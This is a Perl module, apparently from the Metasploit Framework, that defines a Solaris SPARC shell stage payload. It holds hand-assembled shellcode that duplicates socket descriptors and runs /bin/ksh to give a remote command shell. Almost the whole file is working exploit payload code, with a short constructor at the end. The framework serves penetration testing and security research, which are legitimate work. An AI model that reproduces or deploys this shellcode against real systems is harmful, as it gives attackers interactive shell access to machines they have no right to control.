package Msf::PayloadComponent::SolarisShellStage;
use strict;
use base 'Msf::PayloadComponent::SolarisStagePayload';

my $info =
{
    'Authors'      => [ 'optyx <optyx [at] uberhax0r.net>', ],
    'Priv'         => 0,

    'SolarisStagePayload' =>
    {
        Payload =>        
            "\x9a\x02\x60\x3c".     # add          %o1, 60, %o5
            "\x94\x10\x20\x02".     # mov          2, %o2
            "\x90\x10\x00\x17".     # mov          %l7, %o0
            "\x92\x10\x20\x09".     # mov          9, %o1
            "\x82\x10\x20\x3e".     # mov          62, %g1
            "\x91\xd0\x20\x08".     # ta          0x8
            "\x94\x82\xbf\xff".     # addcc          %o2, -1, %o2
            "\x3c\xbf\xff\xfb".     # bpos,a          0x10368
            "\x82\x10\x20\x3b".     # mov          59, %g1
            "\x90\x10\x00\x0d".     # mov          %o5, %o0
            "\xd0\x23\xbf\xf8".     # st          %o0, [%sp - 8]
            "\xc0\x23\xbf\xfc".     # st          %g0, [%sp - 4]
            "\x92\x03\xbf\xf8".     # add          %sp, -8, %o1
            "\x91\xd0\x20\x08".     # ta          0x8
            "\x94\x1a\x80\x0a".     # xor          %o2, %o2, %o2
            "/bin/ksh",
    }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}
